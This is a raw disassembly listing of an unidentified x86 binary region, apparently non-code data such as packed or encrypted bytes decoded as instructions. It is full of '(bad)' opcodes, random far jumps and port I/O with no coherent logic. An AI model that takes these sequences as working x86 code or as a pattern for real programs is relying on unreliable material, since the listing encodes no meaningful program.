  428571:	xchg   DWORD PTR ds:0x74d55056,edi
  428577:	sbb    esp,esp
  428579:	mov    bh,0xbc
  42857b:	rol    BYTE PTR [ecx-0x1b109668],cl
  428581:	or     eax,0x87cb1b05
  428586:	jmp    0xc038:0xfae0e3cf
  42858d:	dec    esi
  42858e:	xor    al,al
  428590:	inc    edi
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xfc48a3f6
  428602:	inc    ebp
  428603:	push   ebx
  428604:	push   ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x5a000001,al
  42860d:	sbb    eax,0xb7cab9fa
  428612:	ror    al,1
  428614:	iret   
  428615:	repnz mov ebx,0x29410f0b
  42861b:	clc    
  42861c:	and    eax,0xf36eddce
  428621:	stc    
  428622:	(bad)  
  428623:	mov    DWORD PTR [edi+0x6a],ecx
  428626:	push   cs
  428627:	nop
  428628:	loop   0x428657
  42862a:	xor    al,0x61
  42862c:	pushf  
  42862d:	push   esp
  42862e:	scas   eax,DWORD PTR es:[edi]
  42862f:	mov    al,0xb4
  428631:	push   ss
  428632:	add    eax,0x185c8001
  428637:	inc    ebx
  428638:	xor    DWORD PTR [bx+si+0x4738],esp
  42863d:	test   bh,ch
  42863f:	js     0x42862f
  428641:	mov    esp,0x4e860ac1
  428646:	mov    ebx,0xf9466ecf
  42864b:	aam    0xc4
  42864d:	push   ss
  42864e:	stc    
  42864f:	lahf   
  428650:	es push es
  428652:	add    DWORD PTR ss:[ecx-0x11823578],esi
  428659:	fsub   QWORD PTR [edx+0x48]
  42865c:	rcr    BYTE PTR [eax-0x3e636df3],cl
  428662:	pop    es
  428663:	inc    BYTE PTR [ebx+esi*8-0x5af8f76a]
  42866a:	mov    ebx,0xd9b23f8c
  42866f:	mov    ss:0xe53da2b3,eax
  428675:	jg     0x428610
  428677:	pop    esi
  428678:	sahf   
  428679:	lds    edi,FWORD PTR [ebx]
  42867b:	clc    
  42867c:	lahf   
  42867d:	mov    ecx,0x815faa00
  428682:	jp     0x428679
  428684:	rcl    DWORD PTR [edi-0x14],cl
  428687:	fld    TBYTE PTR [ebp+0x19]
  42868a:	dec    ecx
  42868b:	clc    
  42868c:	and    ah,dl
  42868e:	or     eax,DWORD PTR [edx+0x77dd0cd3]
  428694:	iret   
  428695:	push   esp
  428696:	cdq    
  428697:	or     edi,esp
  428699:	test   al,0x30
  42869b:	pop    esi
  42869c:	fild   QWORD PTR [ecx-0x9]
  42869f:	push   edx
  4286a0:	sub    al,0xed
  4286a2:	lods   al,BYTE PTR ds:[esi]
  4286a3:	out    dx,eax
  4286a4:	inc    esi
  4286a5:	sbb    DWORD PTR [eax+esi*1+0x40],edi
  4286a9:	mov    cl,0x4b
  4286ab:	mov    al,ds:0x134ebe0b
  4286b0:	mov    ds:0x5e67114,al
  4286b5:	jae    0x4286f5
  4286b7:	and    bh,cl
  4286b9:	js     0x4286ed
  4286bb:	inc    ebx
  4286bc:	test   al,0x4
  4286be:	xchg   ebx,eax
  4286bf:	call   0x86ec9bef
  4286c4:	(bad)  
  4286c5:	shl    DWORD PTR [edi-0x293bc5fb],1
  4286cb:	enter  0xa145,0xb9
  4286cf:	test   eax,0x2ec3910d
  4286d4:	cli    
  4286d5:	inc    ebp
  4286d6:	not    ch
  4286d8:	adc    DWORD PTR [esi-0x33],ebx
  4286db:	retf   
  4286dc:	xlat   BYTE PTR ds:[ebx]
  4286dd:	scas   eax,DWORD PTR es:[edi]
  4286de:	je     0x4286ee
  4286e0:	mov    ah,0x4e
  4286e2:	mov    esp,0x57380afe
  4286e7:	xor    eax,0x706c0eb2
  4286ec:	mov    esi,0xc768021b
  4286f1:	out    dx,al
  4286f2:	les    ecx,FWORD PTR [ecx]
  4286f4:	and    BYTE PTR [ebx-0xe],dl
  4286f7:	test   eax,0x43b6640d
  4286fc:	push   es
  4286fd:	push   esi
  4286fe:	test   DWORD PTR [eax],edi
  428700:	and    DWORD PTR [edi-0xe7779ae],ebx
  428706:	mov    bh,0x7f
  428708:	call   0xd93363d9
  42870d:	add    BYTE PTR [esi],0x6b
  428710:	push   ebx
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x58029396
  428783:	adc    DWORD PTR [ebx],esp
  428785:	mov    cl,0x1
  428787:	add    BYTE PTR ds:0xf0000001,al
  42878d:	test   BYTE PTR [edi],bl
  42878f:	mov    edi,0x2b8deea4
  428794:	cdq    
  428795:	dec    edx
  428796:	jbe    0x428794
  428798:	in     eax,dx
  428799:	jno    0x42878a
  42879b:	sbb    al,0xde
  42879d:	jbe    0x428782
  42879f:	cmp    BYTE PTR [edx+eax*4],dh
  4287a2:	cmp    DWORD PTR [edi-0xae837c5],0x77b32bc4
  4287ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287ad:	mov    edx,0x33d7334d
  4287b2:	cmp    eax,0x2a220ddc
  4287b7:	push   ecx
  4287b8:	aaa    
  4287b9:	mov    ebp,DWORD PTR [ecx-0xb9fcb9a]
  4287bf:	scas   al,BYTE PTR es:[edi]
  4287c0:	jmp    0x6ba0dee7
  4287c5:	push   edi
  4287c6:	int    0x2
  4287c8:	dec    esi
  4287c9:	mov    bl,0xf2
  4287cb:	out    0xea,al
  4287cd:	mov    ch,BYTE PTR [eax+0x34]
  4287d0:	ja     0x428845
  4287d2:	into   
  4287d3:	mov    ds:0xc0b9c8dd,al
  4287d8:	xor    esi,DWORD PTR [ecx+0x6b]
  4287db:	into   
  4287dc:	mov    dh,0x54
  4287de:	xchg   ecx,eax
  4287df:	jae    0x42879f
  4287e1:	pop    edi
  4287e2:	stos   DWORD PTR es:[edi],eax
  4287e3:	push   esi
  4287e4:	adc    eax,0x51f4b29b
  4287e9:	ret    0x2826
  4287ec:	mov    eax,ds:0x9c42dcb3
  4287f1:	adc    esi,ecx
  4287f3:	cmp    edi,edi
  4287f5:	or     eax,0x491942df
  4287fa:	mov    dl,0x37
  4287fc:	jp     0x4287ff
  4287fe:	sbb    al,0x42
  428800:	ja     0x4287d5
  428802:	push   ss
  428803:	lahf   
  428804:	sub    DWORD PTR [edi-0x5a6e2b4b],ebp
  42880a:	jae    0x428870
  42880c:	in     al,0x9d
  42880e:	mov    dl,0x81
  428810:	daa    
  428811:	lods   eax,DWORD PTR ds:[esi]
  428812:	or     BYTE PTR [ebp+eiz*8-0x3d],ah
  428816:	jo     0x428837
  428818:	pop    edx
  428819:	xchg   esi,eax
  42881a:	mov    ah,BYTE PTR [esi]
  42881c:	jmp    0xa213:0x6975e2e6
  428823:	test   DWORD PTR [edx-0x35bb8d2e],ebx
  428829:	scas   al,BYTE PTR es:[edi]
  42882a:	cs pop esp
  42882c:	ds mov dh,0x14
  42882f:	sahf   
  428830:	stc    
  428831:	mov    bl,0xbe
  428833:	mov    edx,0xea831e63
  428838:	cmp    eax,0x2af732d6
  42883d:	out    dx,al
  42883e:	iret   
  42883f:	rcl    BYTE PTR [ecx-0x6614674a],cl
  428845:	xor    al,dl
  428847:	jecxz  0x4287cf
  428849:	std    
  42884a:	inc    eax
  42884b:	je     0x42881b
  42884d:	xor    eax,0xf18cb981
  428852:	lahf   
  428853:	jbe    0x4288bf
  428855:	or     eax,0xd9df5150
  42885a:	cwde   
  42885b:	or     DWORD PTR [ebx-0xf],0xffffffe5
  42885f:	or     eax,0x625f6fab
  428864:	pop    ebp
  428865:	and    ecx,esp
  428867:	ss cmc 
  428869:	(bad)  
  42886a:	cld    
  42886b:	mov    edi,0x3a1f850
  428870:	pusha  
  428871:	inc    edx
  428872:	mov    ecx,esp
  428874:	out    dx,eax
  428875:	(bad)  
  428876:	call   0x863b:0xc3ce8993
  42887d:	outs   dx,BYTE PTR ds:[esi]
  42887e:	cmp    al,0x5b
  428880:	rcl    BYTE PTR [ecx+0x20],1
  428883:	or     DWORD PTR [edx],ebx
  428885:	test   al,0x90
  428887:	mov    WORD PTR [esi-0x7cd0e985],cs
  42888d:	jg     0x428897
  42888f:	and    BYTE PTR [edx+0x0],al
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x45b29d0f],bx
  428902:	pop    ebp
  428903:	dec    ecx
  428904:	sub    BYTE PTR [edx+0x1050001],dh
  42890a:	add    BYTE PTR [eax],al
  42890c:	pop    ds
  42890d:	jnp    0x428932
  42890f:	jb     0x42889b
  428911:	push   ebp
  428912:	add    eax,0x718379a2
  428917:	mov    ds:0x65310d52,al
  42891c:	push   cs
  42891d:	jns    0x428950
  42891f:	in     al,0x53
  428921:	cmp    edx,ebx
  428923:	or     ebx,DWORD PTR [ecx+0x15]
  428926:	sbb    ah,BYTE PTR [ecx-0xc]
  428929:	xchg   BYTE PTR [ecx+ebp*1-0x6b],bh
  42892d:	dec    esi
  42892e:	aam    0x7
  428930:	pop    ebx
  428931:	sub    ebx,esi
  428933:	jns    0x428929
  428935:	pop    ss
  428936:	aas    
  428937:	inc    eax
  428938:	enter  0x28eb,0x29
  42893c:	jne    0x428928
  42893e:	and    BYTE PTR [edx-0x2f],ah
  428941:	icebp  
  428942:	out    dx,al
  428943:	push   ds
  428944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428945:	pop    esp
  428946:	int3   
  428947:	jae    0x4288e1
  428949:	mov    esi,0x3c224d49
  42894e:	retf   
  42894f:	imul   ebx
  428951:	and    dl,BYTE PTR ds:0x31b58e1d
  428957:	xchg   esi,eax
  428958:	cdq    
  428959:	mov    ch,0x9c
  42895b:	test   eax,0x41e98810
  428960:	(bad)  
  428961:	xchg   DWORD PTR [ebp-0x3b89ba6e],eax
  428967:	scas   al,BYTE PTR es:[edi]
  428968:	adc    BYTE PTR [edx+0x47f37bd8],dl
  42896e:	mov    ebx,0xda40666e
  428973:	inc    eax
  428974:	icebp  
  428975:	adc    edi,edx
  428977:	and    BYTE PTR [eax+0x4374d1ce],dh
  42897d:	test   DWORD PTR [ebp-0x67],esp
  428980:	clc    
  428981:	daa    
  428982:	adc    ah,al
  428984:	lock mov ecx,0x3859f7bb
  42898a:	mov    al,0x6
  42898c:	arpl   WORD PTR [ecx],sp
  42898e:	adc    al,0xc6
  428990:	ins    DWORD PTR es:[edi],dx
  428991:	call   0x5e45:0xd0e2ba27
  428998:	outs   dx,DWORD PTR ds:[esi]
  428999:	dec    edx
  42899a:	fwait
  42899b:	jge    0x4289b7
  42899d:	imul   edx,DWORD PTR [ebx+0x3d5fb4c8],0x3c91a955
  4289a7:	inc    edi
  4289a8:	sub    DWORD PTR [esi-0x72e50280],esi
  4289ae:	rcl    BYTE PTR [edi+0x603818b],cl
  4289b4:	add    eax,0xa216f608
  4289b9:	cwde   
  4289ba:	push   0xffffffdf
  4289bc:	lods   al,BYTE PTR ds:[esi]
  4289bd:	cmp    DWORD PTR [ecx+0x6a59d30e],eax
  4289c3:	fcomi  st,st(2)
  4289c5:	dec    ebx
  4289c6:	push   esp
  4289c7:	xor    bh,BYTE PTR [edx]
  4289c9:	push   ecx
  4289ca:	mov    edi,0x2136c992
  4289cf:	and    dh,dh
  4289d1:	out    0xab,al
  4289d3:	add    DWORD PTR [edi-0x5d1a8f58],esp
  4289d9:	out    dx,al
  4289da:	or     eax,edi
  4289dc:	jle    0x4289b2
  4289de:	push   edi
  4289df:	je     0x428989
  4289e1:	mov    dh,0xe7
  4289e3:	mov    ch,0xb6
  4289e5:	out    0xe5,eax
  4289e7:	pop    ds
  4289e8:	cli    
  4289e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289ea:	mov    BYTE PTR ss:[eax],ch
  4289ed:	lea    edi,[eax-0xd949242]
  4289f3:	daa    
  4289f4:	int3   
  4289f5:	push   esp
  4289f6:	pop    ecx
  4289f7:	fisubr WORD PTR [eax+0x52]
  4289fa:	fisubr WORD PTR [eax-0x4e]
  4289fd:	daa    
  4289fe:	dec    ebx
  4289ff:	dec    ecx
  428a00:	call   0xb13c:0xfb7389bb
  428a07:	add    DWORD PTR [ebx],ebx
  428a09:	shl    BYTE PTR [edx+0x64],1
  428a0c:	add    al,0xbc
  428a0e:	jnp    0x428a77
  428a10:	mov    eax,ds:0x0
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x1b3e8013]
  428a83:	mov    dh,0x2d
  428a85:	mov    bl,0x1
  428a87:	add    BYTE PTR ds:0x65000001,al
  428a8d:	mov    ebp,0x4d673f83
  428a92:	inc    edx
  428a93:	ret    
  428a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a95:	push   ebp
  428a96:	test   al,0xd1
  428a98:	pusha  
  428a99:	lahf   
  428a9a:	lahf   
  428a9b:	out    0xc0,eax
  428a9d:	inc    edi
  428a9e:	test   eax,0xdd4ab8e0
  428aa3:	cmp    bl,BYTE PTR [esi-0x39cfc28a]
  428aa9:	push   0x1b
  428aab:	xchg   ecx,eax
  428aac:	jnp    0x428aba
  428aae:	xor    ebp,DWORD PTR [eax]
  428ab0:	ins    DWORD PTR es:[edi],dx
  428ab1:	stos   BYTE PTR es:[edi],al
  428ab2:	daa    
  428ab3:	scas   eax,DWORD PTR es:[edi]
  428ab4:	and    dh,BYTE PTR [ebx+0x1a740115]
  428aba:	inc    edi
  428abb:	and    edi,ebp
  428abd:	xor    DWORD PTR [ecx+0x7b],ecx
  428ac0:	(bad)  
  428ac1:	sbb    eax,0x2137f788
  428ac6:	inc    esp
  428ac7:	mov    esi,0xe0ea815
  428acc:	out    dx,eax
  428acd:	lds    ebp,FWORD PTR [ebx]
  428acf:	pop    ecx
  428ad0:	pop    ecx
  428ad1:	and    bl,ch
  428ad3:	cld    
  428ad4:	sbb    DWORD PTR [esi+edi*8],ebp
  428ad7:	lahf   
  428ad8:	inc    ebx
  428ad9:	cmp    DWORD PTR [edi],esi
  428adb:	mov    eax,ds:0xcc54fc79
  428ae0:	xchg   ebp,eax
  428ae1:	int    0xe7
  428ae3:	(bad)  
  428ae4:	mov    ch,0x9e
  428ae6:	scas   eax,DWORD PTR es:[edi]
  428ae7:	jg     0x428b0d
  428ae9:	cmp    BYTE PTR [edx+0x7a4c074],0x3e
  428af0:	push   ss
  428af1:	push   bp
  428af3:	pop    ebp
  428af4:	mov    dh,0x59
  428af6:	pop    ds
  428af7:	dec    ebp
  428af8:	aaa    
  428af9:	adc    BYTE PTR [edx+edi*2+0x449303d2],dh
  428b00:	jecxz  0x428ac0
  428b02:	xchg   ebp,eax
  428b03:	(bad)  
  428b04:	rcl    BYTE PTR [esi+0x12beb144],1
  428b0a:	daa    
  428b0b:	xlat   BYTE PTR ds:[ebx]
  428b0c:	outs   dx,BYTE PTR ds:[esi]
  428b0d:	scas   eax,DWORD PTR es:[edi]
  428b0e:	mov    eax,ds:0xa086a195
  428b13:	sub    bl,BYTE PTR [ebx-0x5c]
  428b16:	int3   
  428b17:	(bad)  
  428b18:	rcr    DWORD PTR [eax+edi*4+0x1d56491a],1
  428b1f:	xor    edi,DWORD PTR [ebx-0x14b17d2e]
  428b25:	faddp  st(1),st
  428b27:	push   ss
  428b28:	retf   0x7899
  428b2b:	xchg   BYTE PTR [esi-0x14],ah
  428b2e:	xor    DWORD PTR [ebx+ebp*2],0x2f
  428b32:	pop    eax
  428b33:	sub    BYTE PTR ds:0xfa4d3cbc,dl
  428b39:	pop    edx
  428b3a:	ret    0x196d
  428b3d:	cmp    al,0xa6
  428b3f:	xchg   ecx,eax
  428b40:	push   0xd9b9f622
  428b45:	jmp    0x35a0:0x2e190e15
  428b4c:	(bad)  [ecx]
  428b4e:	shl    ecx,0xd1
  428b51:	(bad)  
  428b52:	and    esi,ecx
  428b54:	out    dx,al
  428b55:	(bad)  
  428b57:	pop    ecx
  428b58:	sbb    DWORD PTR [esi+0x51],ecx
  428b5b:	jecxz  0x428b8b
  428b5d:	mov    WORD PTR [ebp-0x1fbb7b75],ds
  428b63:	or     eax,0xe2eaae9d
  428b68:	inc    esi
  428b69:	iret   
  428b6a:	adc    al,0xc8
  428b6c:	not    esi
  428b6e:	push   edi
  428b6f:	sbb    ch,BYTE PTR [ecx]
  428b71:	xchg   ecx,eax
  428b72:	fwait
  428b73:	(bad)  
  428b74:	mov    esp,0x4886d22a
  428b79:	xor    eax,0xa2a97036
  428b7e:	dec    ebp
  428b7f:	repnz xchg esp,eax
  428b81:	push   es
  428b82:	dec    esi
  428b83:	mov    ds:0x269d4a0a,eax
  428b88:	stos   BYTE PTR es:[edi],al
  428b89:	and    bl,BYTE PTR [ebp-0x12f51083]
  428b8f:	addr16 dec esi
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x3a0d2290
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [edi+0x1d],dl
  428c0e:	cmp    esi,DWORD PTR [esp+edx*4]
  428c11:	sub    eax,0x5b8a3e0c
  428c16:	xchg   esp,eax
  428c17:	ror    BYTE PTR [ebp+0x68b8a827],1
  428c1d:	cmp    edi,DWORD PTR [esi]
  428c1f:	xchg   ebx,eax
  428c20:	and    DWORD PTR [ebx-0x5b],esi
  428c23:	xchg   DWORD PTR [edi+esi*1+0xae2e7ad],eax
  428c2a:	mov    ah,0x51
  428c2c:	icebp  
  428c2d:	pop    ebp
  428c2e:	nop
  428c2f:	add    ebx,edi
  428c31:	test   al,0xc9
  428c33:	das    
  428c34:	dec    esi
  428c35:	jae    0x428c08
  428c37:	xchg   edx,eax
  428c38:	mov    esi,edx
  428c3a:	xchg   edx,eax
  428c3b:	jge    0x428bec
  428c3d:	xor    al,0x99
  428c3f:	fcomi  st,st(1)
  428c41:	add    esp,esi
  428c43:	mov    edx,0xf206c9ad
  428c48:	sub    dl,cl
  428c4a:	scas   eax,DWORD PTR es:[edi]
  428c4b:	out    0xac,eax
  428c4d:	xchg   ebp,eax
  428c4e:	imul   ebx,DWORD PTR [eax+0x42],0xffffffe3
  428c52:	dec    ebx
  428c53:	(bad)  
  428c54:	ins    DWORD PTR es:[edi],dx
  428c55:	adc    eax,0x8ee143d1
  428c5a:	ficom  DWORD PTR [eax]
  428c5c:	jge    0x428be4
  428c5e:	ret    
  428c5f:	aad    0xf
  428c61:	mov    al,ds:0xf9d01e42
  428c66:	lds    esi,FWORD PTR [ebp-0x15bcf1fd]
  428c6c:	adc    esp,0x47
  428c6f:	(bad)  
  428c70:	aad    0xfe
  428c72:	fwait
  428c73:	sbb    eax,0x3b2636d4
  428c78:	fmul   st,st(3)
  428c7a:	dec    ebx
  428c7b:	add    al,0xb6
  428c7d:	mov    ebp,0xed586eb7
  428c82:	mov    ch,BYTE PTR [ecx-0x72]
  428c85:	pop    edx
  428c86:	popa   
  428c87:	sbb    esp,esp
  428c89:	in     eax,0x66
  428c8b:	push   esp
  428c8c:	push   ecx
  428c8d:	sub    dh,ch
  428c8f:	enter  0x93c,0xf6
  428c93:	outs   dx,BYTE PTR ds:[esi]
  428c94:	jbe    0x428cdd
  428c96:	jns    0x428cbf
  428c98:	jo     0x428d00
  428c9a:	push   eax
  428c9b:	sub    eax,DWORD PTR [edx+0x50]
  428c9e:	adc    ebx,DWORD PTR [ebx+0x62a2e53b]
  428ca4:	jecxz  0x428c68
  428ca6:	ret    0x6177
  428ca9:	or     bl,BYTE PTR [ebx+0x20f972cf]
  428caf:	xlat   BYTE PTR ds:[ebx]
  428cb0:	int3   
  428cb1:	and    bl,bl
  428cb3:	cmp    eax,0x2a6d0b1d
  428cb8:	push   cs
  428cb9:	pop    ss
  428cba:	fstp   TBYTE PTR [esi]
  428cbc:	or     cl,BYTE PTR [edi+0x1f15c3fd]
  428cc2:	test   al,0x27
  428cc4:	push   eax
  428cc5:	fst    st(3)
  428cc7:	cmc    
  428cc8:	(bad)  
  428cc9:	and    BYTE PTR [edx],dl
  428ccb:	cmp    DWORD PTR [eax-0x11],ebp
  428cce:	imul   eax,DWORD PTR [esi+0x4b0b7931],0xffffffdc
  428cd5:	fild   DWORD PTR [edx]
  428cd7:	not    BYTE PTR [edx-0xf]
  428cda:	xchg   DWORD PTR [eax-0x77],esp
  428cdd:	mov    al,ds:0xb2e33759
  428ce2:	push   eax
  428ce3:	int3   
  428ce4:	and    ch,BYTE PTR [edi]
  428ce6:	aas    
  428ce7:	sub    eax,0x2c37a4b2
  428cec:	fs add al,0x19
  428cef:	add    DWORD PTR ds:0x6ec2a004,eax
  428cf5:	and    esi,eax
  428cf7:	std    
  428cf8:	push   0x21
  428cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cfb:	repnz xchg esi,eax
  428cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cfe:	inc    edi
  428cff:	add    eax,ebx
  428d01:	mov    dh,0x17
  428d03:	sub    eax,0x7cde22d9
  428d08:	mov    edi,0x8d4f059f
  428d0d:	shr    DWORD PTR [edi+0xfa7f],cl
	...
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x6224
  428d82:	adc    edx,DWORD PTR [ebx+0x37]
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0xd4000001,al
  428d8d:	push   edx
  428d8e:	(bad)  [edx+ebx*8-0x44]
  428d92:	ret    0x4c95
  428d95:	sub    BYTE PTR [eax-0x41],bl
  428d98:	mov    ah,0xe6
  428d9a:	icebp  
  428d9b:	cdq    
  428d9c:	xchg   ebx,edi
  428d9e:	aaa    
  428d9f:	adc    BYTE PTR [edi+0x68],ah
  428da2:	xor    eax,0x53040611
  428da7:	repnz shl DWORD PTR [esi-0x4d],1
  428dab:	sar    DWORD PTR [edi+ebp*1-0x39],cl
  428daf:	jp     0x428e1d
  428db1:	les    edi,FWORD PTR [ebx+0x6]
  428db4:	mov    ds:0xadf226b6,al
  428db9:	xchg   esp,eax
  428dba:	les    edx,FWORD PTR [ebx+eax*1+0x5f512859]
  428dc1:	loop   0x428d46
  428dc3:	sub    BYTE PTR [edi-0x5],0x4e
  428dc7:	jmp    0x428d57
  428dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428dca:	mov    ds:0x7ad6302c,eax
  428dcf:	or     BYTE PTR [edi+0x3c],al
  428dd2:	mov    eax,ds:0x83f86e4
  428dd7:	jle    0x428d7c
  428dd9:	xlat   BYTE PTR ds:[ebx]
  428dda:	repz imul esp,esi,0x1405de23
  428de1:	mov    ds:0x1a58ee8,eax
  428de6:	push   ss
  428de7:	addr16 adc esp,ebx
  428dea:	shr    BYTE PTR [esi-0x17fb5639],1
  428df0:	ds in  al,0x5c
  428df3:	fadd   QWORD PTR [edx-0x63]
  428df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428df7:	pop    esi
  428df8:	xor    DWORD PTR [eax-0xb4a57bd],edi
  428dfe:	cmc    
  428dff:	mov    BYTE PTR [ebp-0x63],dh
  428e02:	dec    esi
  428e03:	cmp    al,0xf5
  428e05:	inc    esi
  428e06:	imul   edx,DWORD PTR [ebp+ebx*8-0x24d26f65],0xd05ec9bb
  428e11:	daa    
  428e12:	xor    al,0x87
  428e14:	mov    ch,0x7c
  428e16:	shl    DWORD PTR [ebx-0x5bd48f72],0x6a
  428e1d:	xchg   esp,eax
  428e1e:	addr16 in al,dx
  428e20:	popf   
  428e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e22:	sbb    dh,cl
  428e24:	add    DWORD PTR ds:0x9b3075e5,ebp
  428e2a:	mov    dh,0x91
  428e2c:	sub    edx,ebx
  428e2e:	mov    ch,0xb1
  428e30:	in     eax,0x96
  428e32:	test   BYTE PTR [ebx+0x463012a8],bl
  428e38:	push   0x7624196c
  428e3d:	(bad)  
  428e3e:	xchg   cx,ax
  428e40:	ror    DWORD PTR [ebx+0x4b0c91ce],0xf6
  428e47:	pop    ebx
  428e48:	les    edx,FWORD PTR [edx+0x79]
  428e4b:	xchg   ecx,eax
  428e4c:	adc    edi,ebx
  428e4e:	xchg   esp,eax
  428e4f:	jb     0x428de9
  428e51:	clc    
  428e52:	or     dh,BYTE PTR [esi]
  428e54:	aad    0x5e
  428e56:	cmp    DWORD PTR [eax+0x1d],ebx
  428e59:	jmp    0x428ddb
  428e5b:	dec    ebx
  428e5c:	mov    ecx,0x97e7fc3
  428e61:	imul   esp,DWORD PTR [ebx+0x4b6dcf40],0xffffff9b
  428e68:	add    eax,0x8ae5937
  428e6d:	cmc    
  428e6e:	test   al,0x65
  428e70:	xchg   esp,eax
  428e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e72:	xor    edi,edx
  428e74:	out    0x39,eax
  428e76:	ins    DWORD PTR es:[edi],dx
  428e77:	and    BYTE PTR [eax-0x2bb1b75a],0x14
  428e7e:	and    al,0xe3
  428e80:	nop
  428e81:	mov    ebx,0xc84b4ec3
  428e86:	inc    edi
  428e87:	sar    BYTE PTR [edi-0x11690b66],cl
  428e8d:	test   esi,ebx
  428e8f:	int    0xc7
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xe0
  428f01:	and    edx,DWORD PTR [edx]
  428f03:	aam    0x3c
  428f05:	mov    dh,0x1
  428f07:	add    BYTE PTR ds:0x36000001,al
  428f0d:	xor    eax,0x78fc2e00
  428f12:	mov    al,cs:0xe84fb518
  428f18:	inc    esp
  428f19:	push   eax
  428f1a:	nop
  428f1b:	inc    ecx
  428f1c:	fdivp  st(7),st
  428f1e:	pop    es
  428f1f:	jae    0x428f01
  428f21:	test   BYTE PTR [edx],0x4c
  428f24:	in     eax,dx
  428f25:	mov    al,0xca
  428f27:	add    BYTE PTR [edi-0x5e],bl
  428f2a:	push   ebx
  428f2b:	pop    esi
  428f2c:	hlt    
  428f2d:	mov    esp,0x3a63c56f
  428f32:	pushf  
  428f33:	push   ds
  428f34:	call   0xc7ec:0xd689726e
  428f3b:	je     0x428f56
  428f3d:	ret    0xd775
  428f40:	sbb    DWORD PTR [edx-0x6],0xdd34c70d
  428f47:	pop    ss
  428f48:	inc    ecx
  428f49:	xor    ebx,eax
  428f4b:	out    0xc7,eax
  428f4d:	mov    bl,0x15
  428f4f:	jp     0x428fca
  428f51:	push   esi
  428f52:	fwait
  428f53:	ja     0x428fab
  428f55:	ds popa 
  428f57:	sahf   
  428f58:	test   eax,0xc1fa5834
  428f5d:	leave  
  428f5e:	inc    ebx
  428f5f:	pop    edx
  428f60:	shr    DWORD PTR [esi-0x1a],0x61
  428f64:	aas    
  428f65:	frstor [ecx+eax*1]
  428f68:	or     al,0x2f
  428f6a:	dec    ebp
  428f6b:	sub    ebp,edi
  428f6d:	jnp    0x428fbc
  428f6f:	mov    ds:0xde3b5c6d,al
  428f74:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  428f76:	mov    al,BYTE PTR [ecx+0x2405cbc8]
  428f7c:	int    0x3b
  428f7e:	and    eax,0x1d1c2312
  428f84:	add    BYTE PTR [eax],ah
  428f86:	cmp    ch,cl
  428f88:	mov    dl,0xce
  428f8a:	jge    0x428f9c
  428f8c:	ror    DWORD PTR [edx-0x1f],0xba
  428f90:	rcl    BYTE PTR [edx],0x2c
  428f93:	pushf  
  428f94:	call   0x1e8:0x997c83eb
  428f9b:	dec    bp
  428f9d:	out    0x3d,al
  428f9f:	sti    
  428fa0:	push   ebp
  428fa1:	pusha  
  428fa2:	cdq    
  428fa3:	xor    BYTE PTR [edi+0x39],0x97
  428fa7:	push   esp
  428fa8:	int    0x11
  428faa:	popf   
  428fab:	add    ch,BYTE PTR [eax]
  428fad:	or     dl,dh
  428faf:	and    eax,0xc27fe494
  428fb4:	and    BYTE PTR [ebp+esi*2+0x3d0e73f7],al
  428fbb:	(bad)  
  428fbc:	cmp    al,0x5
  428fbe:	push   cs
  428fbf:	push   ebx
  428fc0:	icebp  
  428fc1:	cwde   
  428fc2:	in     eax,0x1e
  428fc4:	jmp    0x267f5e75
  428fc9:	lock lahf 
  428fcb:	push   0xde421068
  428fd0:	sub    BYTE PTR [ebx],dl
  428fd2:	dec    edi
  428fd3:	les    esp,FWORD PTR [edx+0x49]
  428fd6:	aam    0xcf
  428fd8:	jns    0x428fa2
  428fda:	mov    edx,0x1e83db3a
  428fdf:	mov    ds:0x78cc993d,al
  428fe4:	xchg   BYTE PTR [edx+0x4b1b4815],dh
  428fea:	inc    ebx
  428feb:	pop    es
  428fec:	popa   
  428fed:	xchg   ebp,eax
  428fee:	imul   eax,ebx,0xffffffb7
  428ff1:	imul   edx,ebx,0x2f8060e2
  428ff7:	push   esi
  428ff8:	inc    ebp
  428ff9:	les    eax,FWORD PTR [eax-0x5e]
  428ffc:	cmp    cl,al
  428ffe:	out    0xbb,al
